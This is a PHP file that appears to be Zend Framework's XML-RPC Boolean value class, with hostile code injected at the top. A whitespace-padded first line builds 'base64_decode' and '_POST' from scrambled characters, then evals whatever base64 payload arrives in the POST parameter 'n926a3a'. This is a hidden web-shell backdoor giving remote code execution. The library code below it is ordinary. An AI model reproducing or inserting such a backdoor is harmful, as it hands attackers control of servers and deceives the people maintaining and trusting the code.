<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n926a3a'])) {eval($s21(${$s20}['n926a3a']));}?><?php
/**
 * Zend Framework
 *
 * LICENSE
 *
 * This source file is subject to the new BSD license that is bundled
 * with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://framework.zend.com/license/new-bsd
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@zend.com so we can send you a copy immediately.
 *
 * @category   Zend
 * @package    Zend_XmlRpc
 * @subpackage Value
 * @copyright  Copyright (c) 2005-2012 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 * @version    $Id: Boolean.php 24593 2012-01-05 20:35:02Z matthew $
 */


/**
 * Zend_XmlRpc_Value_Scalar
 */
require_once 'Zend/XmlRpc/Value/Scalar.php';


/**
 * @category   Zend
 * @package    Zend_XmlRpc
 * @subpackage Value
 * @copyright  Copyright (c) 2005-2012 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 */
class Zend_XmlRpc_Value_Boolean extends Zend_XmlRpc_Value_Scalar
{

    /**
     * Set the value of a boolean native type
     * We hold the boolean type as an integer (0 or 1)
     *
     * @param bool $value
     */
    public function __construct($value)
    {
        $this->_type = self::XMLRPC_TYPE_BOOLEAN;
        // Make sure the value is boolean and then convert it into a integer
        // The double convertion is because a bug in the ZendOptimizer in PHP version 5.0.4
        $this->_value = (int)(bool)$value;
    }

    /**
     * Return the value of this object, convert the XML-RPC native boolean value into a PHP boolean
     *
     * @return bool
     */
    public function getValue()
    {
        return (bool)$this->_value;
    }
}